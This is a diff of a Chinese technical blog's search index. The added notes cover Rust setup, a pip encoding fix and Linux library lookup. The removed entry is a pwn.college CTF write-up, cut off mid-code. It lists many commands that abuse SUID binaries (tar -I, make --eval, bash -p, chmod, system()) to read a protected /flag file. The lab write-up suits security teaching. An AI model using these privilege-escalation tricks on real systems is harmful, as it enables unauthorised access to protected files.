+<div class="highlight-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="code"><pre><span class="line">scoop install rustup-gnu</span><br><span class="line">rustup toolchain install stable-x86_64-pc-windows-gnu</span><br><span class="line">rustup default stable-x86_64-pc-windows-gnu</span><br></pre></td></tr></table></figure></div>
+<p>具体可以参考<a class="link"   href="https://stackoverflow.com/questions/73421853/how-to-install-rust-via-cli-on-windows" >https://stackoverflow.com/questions/73421853/how-to-install-rust-via-cli-on-windows <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></p>
+<h4 id="pip-install"><a href="#pip-install" class="headerlink" title="pip install"></a>pip install</h4><p>如果你在使用<code>pip install</code>过程中遇到报错：</p>
+<div class="highlight-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="code"><pre><span class="line"></span><br><span class="line">ERROR: Exception:</span><br><span class="line">Traceback (most recent call last):</span><br><span class="line">  File <span class="string">&quot;E:\scooptools\apps\miniconda3\24.7.1-0\Lib\site-packages\pip\_internal\cli\base_command.py&quot;</span>, line 105, <span class="keyword">in</span> _run_wrapper</span><br><span class="line">    status = _inner_run()</span><br><span class="line">             ^^^^^^^^^^^^</span><br><span class="line">  File <span class="string">&quot;E:\scooptools\apps\miniconda3\24.7.1-0\Lib\site-packages\pip\_internal\cli\base_command.py&quot;</span>, line 96, <span class="keyword">in</span> _inner_run</span><br><span class="line">    <span class="built_in">return</span> self.run(options, args)</span><br><span class="line">           ^^^^^^^^^^^^^^^^^^^^^^^</span><br><span class="line">  File <span class="string">&quot;E:\scooptools\apps\miniconda3\24.7.1-0\Lib\site-packages\pip\_internal\cli\req_command.py&quot;</span>, line 67, <span class="keyword">in</span> wrapper</span><br><span class="line">    <span class="built_in">return</span> func(self, options, args)</span><br><span class="line">           ^^^^^^^^^^^^^^^^^^^^^^^^^</span><br><span class="line">  File <span class="string">&quot;E:\scooptools\apps\miniconda3\24.7.1-0\Lib\site-packages\pip\_internal\commands\install.py&quot;</span>, line 343, <span class="keyword">in</span> run</span><br><span class="line">    reqs = self.get_requirements(args, options, finder, session)</span><br><span class="line">           ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^</span><br><span class="line">  File <span class="string">&quot;E:\scooptools\apps\miniconda3\24.7.1-0\Lib\site-packages\pip\_internal\cli\req_command.py&quot;</span>, line 255, <span class="keyword">in</span> get_requirements</span><br><span class="line">    <span class="keyword">for</span> parsed_req <span class="keyword">in</span> parse_requirements(</span><br><span class="line">  File <span class="string">&quot;E:\scooptools\apps\miniconda3\24.7.1-0\Lib\site-packages\pip\_internal\req\req_file.py&quot;</span>, line 151, <span class="keyword">in</span> parse_requirements</span><br><span class="line">    <span class="keyword">for</span> parsed_line <span class="keyword">in</span> parser.parse(filename, constraint):</span><br><span class="line">  File <span class="string">&quot;E:\scooptools\apps\miniconda3\24.7.1-0\Lib\site-packages\pip\_internal\req\req_file.py&quot;</span>, line 332, <span class="keyword">in</span> parse</span><br><span class="line">    yield from self._parse_and_recurse(filename, constraint)</span><br><span class="line">  File <span class="string">&quot;E:\scooptools\apps\miniconda3\24.7.1-0\Lib\site-packages\pip\_internal\req\req_file.py&quot;</span>, line 337, <span class="keyword">in</span> _parse_and_recurse</span><br><span class="line">    <span class="keyword">for</span> line <span class="keyword">in</span> self._parse_file(filename, constraint):</span><br><span class="line">  File <span class="string">&quot;E:\scooptools\apps\miniconda3\24.7.1-0\Lib\site-packages\pip\_internal\req\req_file.py&quot;</span>, line 368, <span class="keyword">in</span> _parse_file</span><br><span class="line">    _, content = get_file_content(filename, self._session)</span><br><span class="line">                 ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^</span><br><span class="line">  File <span class="string">&quot;E:\scooptools\apps\miniconda3\24.7.1-0\Lib\site-packages\pip\_internal\req\req_file.py&quot;</span>, line 548, <span class="keyword">in</span> get_file_content</span><br><span class="line">    content = auto_decode(f.read())</span><br><span class="line">              ^^^^^^^^^^^^^^^^^^^^^</span><br><span class="line">  File <span class="string">&quot;E:\scooptools\apps\miniconda3\24.7.1-0\Lib\site-packages\pip\_internal\utils\encoding.py&quot;</span>, line 34, <span class="keyword">in</span> auto_decode</span><br><span class="line">    <span class="built_in">return</span> data.decode(</span><br><span class="line">           ^^^^^^^^^^^^</span><br><span class="line">UnicodeDecodeError: <span class="string">&#x27;gbk&#x27;</span> codec can<span class="string">&#x27;t decode byte 0xb4 in position 343: illegal multibyte sequence</span></span><br><span class="line"><span class="string">decoding with &#x27;</span>cp936<span class="string">&#x27; codec failed</span></span><br></pre></td></tr></table></figure></div>
+<p>你需要在Windows的系统变量中添加<code>PYTHONUTF8</code>，将其值设置为1，如图：<br><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="/../images/PixPin_2024-10-02_21-22-00.png"
+                     
+                ></p>
+<p>或许也可以使用<code>chcp 65001</code>临时修改编码，然后<code>pip install</code>，但是我依然报错。</p>
+]]></content>
+      <tags>
+        <tag>tools</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>linux lib</title>
+    <url>/2024/05/12/linux-lib/</url>
+    <content><![CDATA[<h1 id="查找库文件"><a href="#查找库文件" class="headerlink" title="查找库文件"></a>查找库文件</h1><p><strong>locate</strong>：<br>首先要确保<code>locate</code>数据库是最新的：</p>
+<div class="highlight-container" data-rel="Shell"><figure class="iseeu highlight shell"><table><tr><td class="code"><pre><span class="line">sudo updatedb</span><br></pre></td></tr></table></figure></div>
+<p>然后查找库文件：</p>
+<div class="highlight-container" data-rel="Shell"><figure class="iseeu highlight shell"><table><tr><td class="code"><pre><span class="line">locate libpthread.so</span><br></pre></td></tr></table></figure></div>
+
+<p><br><br></p>
+<h1 id="确认库文件的存在"><a href="#确认库文件的存在" class="headerlink" title="确认库文件的存在"></a>确认库文件的存在</h1><p><strong>ldconfig -p</strong>：这个命令显示链接器的库缓存中所有已知的库，它可以检查特定的库是否已在系统的链接器配置中</p>
+<div class="highlight-container" data-rel="Shell"><figure class="iseeu highlight shell"><table><tr><td class="code"><pre><span class="line">ldconfig -p | grep libpthread</span><br></pre></td></tr></table></figure></div>
+
+<p><br><br></p>
+<h1 id="安装库文件"><a href="#安装库文件" class="headerlink" title="安装库文件"></a>安装库文件</h1><p>使用系统对应的包管理器安装</p>
+<p><br><br></p>
+<h1 id="查看库文件的基本信息"><a href="#查看库文件的基本信息" class="headerlink" title="查看库文件的基本信息"></a>查看库文件的基本信息</h1><p><strong>dpkg -L</strong>：用于列出指定软件包中的所有文件，包括库文件。例如：</p>
+<div class="highlight-container" data-rel="Shell"><figure class="iseeu highlight shell"><table><tr><td class="code"><pre><span class="line">dpkg -L libc6-dev</span><br></pre></td></tr></table></figure></div>
+
+<p><br><br></p>
+<h1 id="确定库文件的链接路径"><a href="#确定库文件的链接路径" class="headerlink" title="确定库文件的链接路径"></a>确定库文件的链接路径</h1><p>**&#x2F;etc&#x2F;ld.so.conf 和 &#x2F;etc&#x2F;ld.so.conf.d&#x2F;**：这些配置文件和目录定义了链接器搜索动态库的路径。可以查看和修改这些文件以包含或确认包含必要的库文件路径。</p>
+<p><br><br></p>
+<h1 id="更新链接器的配置"><a href="#更新链接器的配置" class="headerlink" title="更新链接器的配置"></a>更新链接器的配置</h1><p><strong>ldconfig</strong>：当更改了 <code>ld.so.conf</code> 或在库目录中添加了新的库文件后，运行此命令更新链接器的缓存。</p>
+]]></content>
+      <tags>
+        <tag>tools</tag>
       </tags>
   </entry>
   <entry>
@@ -1044,244 +1296,41 @@
       </tags>
   </entry>
   <entry>
-    <title>Program Misuse</title>
-    <url>/2023/09/24/ProgramMisuse/</url>
-    <content><![CDATA[<p>这里记录的是ASU 466课程的解题记录,<a class="link"   href="https://pwn.college/" >pwn <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a>,这一小节的题目只要学会看<code>man page</code>就能写出来。</p>
-<h3 id="1"><a href="#1" class="headerlink" title="1"></a>1</h3><div class="highlight-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="built_in">cat</span> /flag</span><br></pre></td></tr></table></figure></div>
-
-
-<h3 id="2"><a href="#2" class="headerlink" title="2"></a>2</h3><div class="highlight-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="code"><pre><span class="line">more /flag</span><br></pre></td></tr></table></figure></div>
-
-<h3 id="3"><a href="#3" class="headerlink" title="3"></a>3</h3><div class="highlight-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="code"><pre><span class="line">less /flag</span><br></pre></td></tr></table></figure></div>
-
-<h3 id="4"><a href="#4" class="headerlink" title="4"></a>4</h3><div class="highlight-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="built_in">tail</span> /flag</span><br></pre></td></tr></table></figure></div>
-
-<h3 id="5"><a href="#5" class="headerlink" title="5"></a>5</h3><div class="highlight-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="built_in">head</span> /flag</span><br></pre></td></tr></table></figure></div>
-
-
-<h3 id="6"><a href="#6" class="headerlink" title="6"></a>6</h3><div class="highlight-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="built_in">sort</span> /flag</span><br></pre></td></tr></table></figure></div>
-
-<h3 id="7"><a href="#7" class="headerlink" title="7"></a>7</h3><div class="highlight-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="code"><pre><span class="line">vim /flag</span><br></pre></td></tr></table></figure></div>
-
-<h3 id="8"><a href="#8" class="headerlink" title="8"></a>8</h3><div class="highlight-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="code"><pre><span class="line">emacs /flag</span><br></pre></td></tr></table></figure></div>
-
-<h3 id="9"><a href="#9" class="headerlink" title="9"></a>9</h3><div class="highlight-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="code"><pre><span class="line">nano /flag</span><br></pre></td></tr></table></figure></div>
-
-<h3 id="10"><a href="#10" class="headerlink" title="10"></a>10</h3><div class="highlight-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="code"><pre><span class="line">rev /flag | rev</span><br></pre></td></tr></table></figure></div>
-
-<h3 id="11"><a href="#11" class="headerlink" title="11"></a>11</h3><div class="highlight-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="built_in">od</span> -w100 -c /flag | sed <span class="string">&#x27;s# ##g&#x27;</span></span><br></pre></td></tr></table></figure></div>
-
-<h3 id="12"><a href="#12" class="headerlink" title="12"></a>12</h3><div class="highlight-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="code"><pre><span class="line">hd -f /flag</span><br></pre></td></tr></table></figure></div>
-
-<h3 id="13"><a href="#13" class="headerlink" title="13"></a>13</h3><div class="highlight-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="code"><pre><span class="line">xxd /flag</span><br></pre></td></tr></table></figure></div>
-
-<h3 id="14"><a href="#14" class="headerlink" title="14"></a>14</h3><div class="highlight-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="built_in">base32</span> /flag | <span class="built_in">base32</span> -d</span><br></pre></td></tr></table></figure></div>
-<p>注意这里不能直接<code>base32 -d /flag</code>，因为<code>-d</code>参数要有东西才能解码，所以要先用<code>base32</code>把<code>/flag</code>读出来</p>
-<h3 id="15"><a href="#15" class="headerlink" title="15"></a>15</h3><div class="highlight-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="built_in">base64</span> /flag | <span class="built_in">base64</span> -d</span><br></pre></td></tr></table></figure></div>
-
-<h3 id="16"><a href="#16" class="headerlink" title="16"></a>16</h3><div class="highlight-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="built_in">split</span> /flag</span><br><span class="line"><span class="built_in">cat</span> xaa</span><br></pre></td></tr></table></figure></div>
-
-<h3 id="17"><a href="#17" class="headerlink" title="17"></a>17</h3><div class="highlight-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="code"><pre><span class="line">gzip -c /flag | gzip -d</span><br></pre></td></tr></table></figure></div>
-
-<h3 id="18"><a href="#18" class="headerlink" title="18"></a>18</h3><div class="highlight-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="code"><pre><span class="line">bzip2 -c /flag | bzip2 -d</span><br></pre></td></tr></table></figure></div>
-
-<h3 id="19"><a href="#19" class="headerlink" title="19"></a>19</h3><div class="highlight-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="code"><pre><span class="line">zip -r /flag.zip /flag</span><br><span class="line">unzip -p /flag</span><br></pre></td></tr></table></figure></div>
-<p>这里要注意<code>zip</code>命令的顺序，是被压缩后的名字在前，要压缩的文件在后，要加上<code>-r</code>参数</p>
-<h3 id="20"><a href="#20" class="headerlink" title="20"></a>20</h3><div class="highlight-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="code"><pre><span class="line">tar -cvf flag.tar /flag</span><br><span class="line">tar xf flag.tar -O</span><br></pre></td></tr></table></figure></div>
-<p>or</p>
-<div class="highlight-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="code"><pre><span class="line">tar xf /flag -I <span class="string">&#x27;/bin/sh -c &quot;cat 1&gt;&amp;2&quot;&#x27;</span></span><br></pre></td></tr></table></figure></div>
-<p>第一个是延续压缩+解压的思路，下面是在网上看到的，利用<code>-I</code>参数执行额外程序的方法获得<code>flag</code></p>
-<h3 id="21"><a href="#21" class="headerlink" title="21"></a>21</h3><div class="highlight-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="code"><pre><span class="line">ar -q flag.ar /flag</span><br><span class="line"><span class="built_in">cat</span> flag.ar</span><br></pre></td></tr></table></figure></div>
-
-<h3 id="22"><a href="#22" class="headerlink" title="22"></a>22</h3><div class="highlight-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="built_in">echo</span> <span class="string">&quot;/flag&quot;</span> | cpio -o &gt; flag.cpio</span><br><span class="line"><span class="built_in">cat</span> flag.cpio</span><br></pre></td></tr></table></figure></div>
-
-<h3 id="23"><a href="#23" class="headerlink" title="23"></a>23</h3><div class="highlight-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="code"><pre><span class="line">genisoimage -<span class="built_in">sort</span> /flag</span><br></pre></td></tr></table></figure></div>
-
-<h3 id="24"><a href="#24" class="headerlink" title="24"></a>24</h3><div class="highlight-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="built_in">env</span> <span class="built_in">cat</span> /flag</span><br></pre></td></tr></table></figure></div>
-
-
-<h3 id="25"><a href="#25" class="headerlink" title="25"></a>25</h3><div class="highlight-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="code"><pre><span class="line">find . -<span class="built_in">exec</span> <span class="built_in">cat</span> /flag \; -quit</span><br></pre></td></tr></table></figure></div>
-<p>这里后面不加<code>quit</code>会一直<code>find</code></p>
-<h3 id="26"><a href="#26" class="headerlink" title="26"></a>26</h3><div class="highlight-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="code"><pre><span class="line">vim Makefile</span><br><span class="line">    run:</span><br><span class="line">        <span class="built_in">cat</span> /flag</span><br><span class="line"></span><br><span class="line">make run</span><br></pre></td></tr></table></figure></div>
-<p>or</p>
-<div class="highlight-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="code"><pre><span class="line">COMMAND=<span class="string">&#x27;cat /flag&#x27;</span>;make -s --<span class="built_in">eval</span>=$<span class="string">&#x27;x:\n\t-&#x27;</span><span class="string">&quot;<span class="variable">$COMMAND</span>&quot;</span></span><br></pre></td></tr></table></figure></div>
-<p><code>-s</code>选项告诉<code>make</code>以静默模式运行，也就是不输出详细的构建信息，只显示关键信息。<br><code>--eval=$&#39;x:\n\t-&#39;&quot;$COMMAND&quot;</code>:<code>--eval</code>用于在执行<code>make</code>时求值指定的表达式；<code>$&#39;x:\n\t-&#39;&quot;COMMAND&quot;</code>是一个将表达式传递给<code>make</code>的字符串<br><code>-x</code>是一个<code>Makefile</code>规则，它指定了一个名为<code>x</code>的目标。在这个例子中，<code>x</code>是目标的名字，后面的冒号表示这是一个伪目标。<br><code>\n\t-</code>是一个转义字符序列，表示一个换行符和一个制表符。这是<code>Makefile</code>语法中规定的，用于表示命令行的缩进。<br><code>&quot;$COMMAND&quot;</code>会被展开为前面定义的<code>COMMAND</code>变量的值 ，也就是<code>cat /flag</code>。这将作为<code>x</code>目标的执行命令。</p>
-<h3 id="27"><a href="#27" class="headerlink" title="27"></a>27</h3><div class="highlight-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="built_in">nice</span> <span class="built_in">cat</span> /flag</span><br></pre></td></tr></table></figure></div>
-
-
-<h3 id="28"><a href="#28" class="headerlink" title="28"></a>28</h3><div class="highlight-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="built_in">timeout</span> 7d <span class="built_in">cat</span> /flag</span><br><span class="line"></span><br></pre></td></tr></table></figure></div>
-
-
-<h3 id="29"><a href="#29" class="headerlink" title="29"></a>29</h3><div class="highlight-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="built_in">stdbuf</span> -i0 <span class="built_in">cat</span> /flag</span><br></pre></td></tr></table></figure></div>
-
-<h3 id="30"><a href="#30" class="headerlink" title="30"></a>30</h3><div class="highlight-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="code"><pre><span class="line">setarch $(<span class="built_in">arch</span>) <span class="built_in">cat</span> /flag</span><br></pre></td></tr></table></figure></div>
-
-
-<h3 id="31"><a href="#31" class="headerlink" title="31"></a>31</h3><div class="highlight-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="code"><pre><span class="line">watch -x <span class="built_in">cat</span> /flag</span><br></pre></td></tr></table></figure></div>
-
-
-<h3 id="32"><a href="#32" class="headerlink" title="32"></a>32</h3><div class="highlight-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="code"><pre><span class="line">socat -u FILE:/flag STDOUT</span><br></pre></td></tr></table></figure></div>
-
-<h3 id="33"><a href="#33" class="headerlink" title="33"></a>33</h3><div class="highlight-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="code"><pre><span class="line">whiptail --textbox --scrolltext /flag 20 80</span><br></pre></td></tr></table></figure></div>
-
-<h3 id="34"><a href="#34" class="headerlink" title="34"></a>34</h3><div class="highlight-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="code"><pre><span class="line">awk <span class="string">&#x27;&#123;print&#125;&#x27;</span> /flag</span><br></pre></td></tr></table></figure></div>
-
-<h3 id="35"><a href="#35" class="headerlink" title="35"></a>35</h3><div class="highlight-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="code"><pre><span class="line">sed -n <span class="string">&#x27;p&#x27;</span> /flag</span><br></pre></td></tr></table></figure></div>
-
-<h3 id="36"><a href="#36" class="headerlink" title="36"></a>36</h3><div class="highlight-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="code"><pre><span class="line">ed /flag</span><br><span class="line">,p</span><br></pre></td></tr></table></figure></div>
-<p>or</p>
-<div class="highlight-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="built_in">echo</span> n | ed /flag</span><br></pre></td></tr></table></figure></div>
-<p>打开名为 <code>/flag</code> 的文件，并向 <code>ed</code> 命令传递了字符 <code>n</code>。在 <code>ed</code> 编辑器中，<code>n</code> 通常用于打印当前行的内容。</p>
-<h3 id="37"><a href="#37" class="headerlink" title="37"></a>37</h3><div class="highlight-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="built_in">chown</span> -c hacker /flag</span><br><span class="line"><span class="built_in">cat</span> /flag</span><br></pre></td></tr></table></figure></div>
-
-<h3 id="38"><a href="#38" class="headerlink" title="38"></a>38</h3><div class="highlight-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="built_in">chmod</span> 777 /flag &amp;&amp; <span class="built_in">cat</span> /flag</span><br></pre></td></tr></table></figure></div>
-
-<h3 id="39"><a href="#39" class="headerlink" title="39"></a>39</h3><div class="highlight-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="built_in">cp</span> /flag /dev/stdout</span><br></pre></td></tr></table></figure></div>
-<p>震惊!原来还可以这样输出!</p>
-<h3 id="40"><a href="#40" class="headerlink" title="40"></a>40</h3><div class="highlight-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="built_in">mv</span> /usr/bin/cat /usr/bin/mv</span><br><span class="line"></span><br><span class="line"><span class="built_in">mv</span> /flag</span><br></pre></td></tr></table></figure></div>
-
-
-<h3 id="41"><a href="#41" class="headerlink" title="41"></a>41</h3><p>perl脚本</p>
-<div class="highlight-container" data-rel="Perl"><figure class="iseeu highlight perl"><table><tr><td class="code"><pre><span class="line"><span class="keyword">my</span> $flags=<span class="string">&quot;/flag&quot;</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">open</span>(<span class="keyword">my</span> $flag,<span class="string">&#x27;&lt;&#x27;</span>,$flags) <span class="keyword">or</span> <span class="keyword">die</span> <span class="string">&quot;Could not open file: $!&quot;</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">while</span>(<span class="keyword">my</span> $line = &lt;$flag&gt;)&#123;</span><br><span class="line">        <span class="keyword">print</span> $line;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">close</span> ($flag);</span><br></pre></td></tr></table></figure></div>
-<p>perl脚本和bash脚本的区别:<br>        Perl（Practical Extraction and Reporting Language）和Bash（Bourne-Again Shell）是两种不同的编程语言，它们有一些显著的区别：<br>        1. <strong>用途</strong>:<br>            - <strong>Perl</strong> 是一种通用的编程语言，专注于文本处理、数据转换、报告生成、正则表达式和系统管理等任务。Perl通常用于处理复杂的文本操作和数据处理任务。<br>            - <strong>Bash</strong> 是一种Unix Shell脚本语言，用于操作和自动化命令行环境中的任务。Bash通常用于执行系统命令、管理文件系统、编写简单的脚本以及处理系统级任务。<br>        2. <strong>语法</strong>:<br>            - <strong>Perl</strong> 具有一种更灵活和强大的语法，支持面向对象编程、函数式编程、正则表达式和高级数据结构。它有强大的字符串处理能力和大量的内置模块。<br>            - <strong>Bash</strong> 的语法相对较简单，主要用于执行命令和控制流操作。它适用于简单的脚本编写和自动化任务。<br>        3. <strong>数据类型</strong>:<br>            - <strong>Perl</strong> 具有更多的内置数据类型，包括标量（scalar）、数组（array）、哈希（hash）以及对象。它对数据处理和数据结构操作更为灵活。<br>            - <strong>Bash</strong> 主要处理文本和字符串，虽然可以处理数组，但对于更复杂的数据结构支持较弱。<br>        4. <strong>模块和库</strong>:<br>            - <strong>Perl</strong> 拥有丰富的模块和库，涵盖了各种领域，可以加速开发。CPAN（Comprehensive Perl Archive Network）是Perl社区的模块存储库，包含了大量的开源模块。<br>            - <strong>Bash</strong> 虽然有一些内置的函数和工具，但它的生态系统相对较小，通常需要依赖于外部工具和命令行实用程序来执行复杂的任务。<br>        5. <strong>适用场景</strong>:<br>            - <strong>Perl</strong> 更适合于需要复杂文本处理、正则表达式、数据转换、网络编程、脚本测试和大型应用程序开发等任务。<br>            - <strong>Bash</strong> 更适合于系统管理、自动化任务、批处理处理、简单脚本编写以及与命令行工具的交互。<br>        总之，Perl和Bash是两种不同的编程语言，各自在不同的领域和用途中具有优势。选择使用哪种语言取决于您要解决的具体问题和任务的性质。有时，它们也可以结合使用，以充分利用各自的优势。</p>
-<h3 id="42"><a href="#42" class="headerlink" title="42"></a>42</h3><div class="highlight-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> os</span><br><span class="line"></span><br><span class="line"><span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&quot;/flag&quot;</span>,<span class="string">&quot;r&quot;</span>) <span class="keyword">as</span> file:</span><br><span class="line">    content = file.read()</span><br><span class="line">    <span class="built_in">print</span>(content)</span><br></pre></td></tr></table></figure></div>
-
-
-<h3 id="43"><a href="#43" class="headerlink" title="43"></a>43</h3><div class="highlight-container" data-rel="Ruby"><figure class="iseeu highlight ruby"><table><tr><td class="code"><pre><span class="line">flag = <span class="string">&quot;/flag&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">begin</span></span><br><span class="line">  file = <span class="title class_">File</span>.open(flag,<span class="string">&quot;r&quot;</span>)</span><br><span class="line">  content = file.read</span><br><span class="line">  puts content</span><br><span class="line"><span class="keyword">rescue</span> <span class="title class_">Errno</span><span class="symbol">:</span><span class="symbol">:ENOENT</span></span><br><span class="line">  puts <span class="string">&quot;File &#x27;<span class="subst">#&#123;flag&#125;</span>&#x27; not fount.&quot;</span></span><br><span class="line"><span class="keyword">rescue</span> <span class="title class_">StandardError</span> =&gt; e</span><br><span class="line">  puts <span class="string">&quot;An error occurred: <span class="subst">#&#123;e&#125;</span>&quot;</span></span><br><span class="line"><span class="keyword">ensure</span></span><br><span class="line">  file.close <span class="keyword">if</span> file</span><br><span class="line"><span class="keyword">end</span></span><br></pre></td></tr></table></figure></div>
-
-
-<h3 id="44"><a href="#44" class="headerlink" title="44"></a>44</h3><p>本题最开始是和上面一样尝试写一个bash脚本，然后使用bash命令去执行，但发现依然没有权限访问flag。</p>
-<div class="highlight-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="meta">#!/usr/bin/bash</span></span><br><span class="line">filename=<span class="string">&quot;/flag&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> [ ! -f <span class="string">&quot;<span class="variable">$filename</span>&quot;</span> ]; <span class="keyword">then</span></span><br><span class="line">  <span class="built_in">echo</span> <span class="string">&quot;File &#x27;<span class="variable">$filename</span>&#x27; not found.&quot;</span></span><br><span class="line">  <span class="built_in">exit</span> 1</span><br><span class="line"><span class="keyword">fi</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">while</span> IFS= <span class="built_in">read</span> -r line; <span class="keyword">do</span></span><br><span class="line">  <span class="built_in">echo</span> <span class="string">&quot;<span class="variable">$line</span>&quot;</span></span><br><span class="line"><span class="keyword">done</span> &lt; <span class="string">&quot;<span class="variable">$filename</span>&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">exit</span> 0</span><br></pre></td></tr></table></figure></div>
-
-<div class="highlight-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="meta">#!/usr/bin/bash</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">cat</span> /flag</span><br><span class="line"></span><br><span class="line"><span class="built_in">exit</span> 0</span><br></pre></td></tr></table></figure></div>
-<p>以上两个均会报错权限不允许<br>后经查阅发现是需要使用<code>bash -p</code> 进行提权，它的意思是以安全模式启动<code>bash</code>，因为在这里<code>bash</code>设置了<code>SUID</code> ，所以在这里是执行了之后相当于在当前命令行下执行的命令都具有bash命令的权限，然后直接使用<code>cat /flag</code> 就好了</p>
-<h3 id="45"><a href="#45" class="headerlink" title="45"></a>45</h3><p>在经过查阅<code>date</code>命令并进行尝试后试出答案，理论上是使用<code>date</code>命令直接报错输出<code>/flag</code>里面的内容</p>
-<div class="highlight-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="built_in">date</span> -f /flag</span><br><span class="line"></span><br></pre></td></tr></table></figure></div>
-
-<h3 id="46"><a href="#46" class="headerlink" title="46"></a>46</h3><div class="highlight-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="code"><pre><span class="line">demsg -F /flag</span><br></pre></td></tr></table></figure></div>
-
-
-<h3 id="47"><a href="#47" class="headerlink" title="47"></a>47</h3><div class="highlight-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="built_in">wc</span> -l --files0-from=/flag</span><br></pre></td></tr></table></figure></div>
-
-
-<h3 id="48"><a href="#48" class="headerlink" title="48"></a>48</h3><div class="highlight-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="code"><pre><span class="line">gcc -E -x c /flag</span><br></pre></td></tr></table></figure></div>
-<p>本题最初是想写一个c文件编译读取，但写完后发现不行，和<code>bash</code>那个一样<a href="###44">44</a>，经查阅后发现需要这样读取<code>/flag</code></p>
-<div class="highlight-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span> &#123;</span><br><span class="line"></span><br><span class="line">    <span class="type">int</span> result = system(<span class="string">&quot;cat /flag&quot;</span>);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (result == <span class="number">-1</span>) &#123;</span><br><span class="line">        perror(<span class="string">&quot;Error executing cat command&quot;</span>);</span><br><span class="line">        <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">    &#125;</span><br><span 